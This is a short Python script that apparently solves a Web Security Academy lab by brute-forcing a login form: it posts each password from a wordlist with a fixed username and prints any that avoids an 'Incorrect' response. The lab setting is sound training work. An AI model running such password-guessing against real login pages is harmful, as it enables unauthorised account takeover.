import requests

url = 'https://0a1b00eb04b4151f80b371c2003c00eb.web-security-academy.net/login'


lines = [line.strip() for line in open("../pass.txt", "r")]
for line in lines:
    payload = {"username" : "aq", "password" : line}
    owo = requests.post(url, data=payload)
    if "Incorrect" in owo.text:
        continue
    else:
        print(line)
